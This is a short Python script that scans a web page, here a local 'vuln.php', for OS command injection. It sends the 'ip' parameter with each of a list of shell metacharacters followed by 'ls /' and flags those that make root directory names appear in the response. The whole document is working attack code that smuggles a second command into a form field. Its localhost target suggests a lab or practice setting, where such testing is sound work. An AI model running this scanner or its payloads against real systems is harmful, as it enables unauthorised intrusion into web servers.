import requests
url = "http://localhost:8000/vuln.php"
ip="127.0.0.1"
cmd="ls /"
shell_metacharacters = [';','|','&','&&','||','$','>','>>','<','`','$()','\\','*','?','~','(', ')','[', ']','\n','\r']
outputs=['tmp','bin','boot','data','etc']
print("[*] Scanning for command injection vulnerabilities...\n")
for i in shell_metacharacters:
    payload = ip + i + cmd
    response = requests.get(url, params={'ip': payload})
    for j in outputs:
        if j in response.text:
            print(f"[!!] Injection likely with metacharacter '{i}'")
            print(f"     Payload: {payload}")
            print("-" * 60)
